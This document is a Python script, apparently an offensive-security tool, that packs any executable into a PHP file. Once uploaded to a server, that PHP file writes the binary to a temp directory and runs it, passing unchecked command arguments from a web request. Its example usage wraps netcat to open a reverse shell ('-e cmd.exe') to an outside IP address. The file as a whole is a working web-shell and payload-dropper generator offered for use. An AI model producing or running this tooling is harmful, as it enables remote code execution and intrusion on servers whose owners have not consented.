#!/usr/bin/env python3
###############################################################################
# 'Convert' an executable file to a php file so you can upload and run programs
# or shells in those instances where you can upload a php file.
#
# Only use for good, not bad. ;)
#
# Inspired by https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
###############################################################################
import argparse
import base64
import random
import string
import sys
import zlib

def exe2php(file,output,args,platform):
	payload = ''
	tmpdir = ''
	additional = ''
	filename = ''
	
	if platform=='auto':
		if file.endswith('.exe'):
			platform='windows'
		else:
			platform='linux'
			
	if platform=='windows':
		tmpdir = 'C:\\windows\\temp'
		filename = ''.join(random.choice(string.ascii_lowercase) for i in range(8)) + '.exe'
	else:
		tmpdir = '/tmp'
		filename = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
		additional = 'system("chmod +x %s");' % (filename)
	
	with open(file, mode='rb') as file:
		payload = base64.b64encode(gzdeflate(file.read()))
		
	with open(output, mode='w') as output:
		output.write('''<?php
	header("Content-type: text/plain");
	$payload="{payload}";
	$evalCode = gzinflate(base64_decode($payload));
	$tmpdir = "{tmpdir}";
	chdir($tmpdir);
	$file = fopen("{filename}", "wb");
	fwrite($file, $evalCode);
	fclose($file);
	{additional}
    $cmd=""
    if(isset($_GET['args'])) {{
	    $cmd = "{filename} ".$_GET['args'];
    }} else {{
        $cmd = "{filename} {args}";
    }}
	echo "Attempting to run <pre>".$cmd."</pre>";
	$output = system($cmd);
	echo "\\n\\n";
	echo $output;
?>
'''.format(payload=payload.decode('latin-1'), tmpdir=tmpdir, filename=filename, additional=additional, args=args))
		
# Shamelessly stolen from https://www.php2python.com/wiki/function.gzdeflate/
def gzdeflate(data: bytes) -> bytes:
	compressor = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS)
	compressed = compressor.compress(data)
	compressed += compressor.flush()
	return compressed

###############################################################################
# Overload argparse to avoid error message
class CustomParser(argparse.ArgumentParser):
	def error(self, message):
		self.print_help()
		sys.exit(2)

###############################################################################
def main():
	## Build Parser #####
	parser = CustomParser(description='Create a PHP "wrapped" executable.',
	                      epilog='Example usage: {exe} -f nc.exe -a "-e cmd.exe 10.0.0.1 1234"'.format(exe=sys.argv[0]))
	
	# Parser -> executable file
	parser.add_argument('-f','--file', \
	                    metavar = 'EXECUTABLE', \
	                    required = True, \
	                    type = str, \
	                    help = 'The executable file that needs to be wrapped in PHP.')
	                    
	# Parser -> output file
	parser.add_argument('-o','--output', \
	                    metavar = 'PHP', \
	                    required = False, \
	                    default = 'executable.php', \
	                    type = str, \
	                    help = 'The resulting PHP file.')
	                    
	# Parser -> arguments
	parser.add_argument('-a','--args', \
	                    metavar = '"ARG1 ARG2 ARGN"', \
	                    required = False, \
	                    default = '', \
	                    type = str, \
	                    help = 'Arguments to pass to the executable when run.')
	                    
	# Parser -> platform
	parser.add_argument('-p','--platform', \
	                    metavar = 'OS', \
	                    required = False, \
	                    choices = ['auto', 'windows', 'linux'], \
	                    default = 'auto', \
	                    type = str, \
	                    help = 'Target\'s OS platform.')
	                    
	args = parser.parse_args()
	
	exe2php(file=args.file,output=args.output,args=args.args,platform=args.platform)

if __name__ == "__main__":
	main()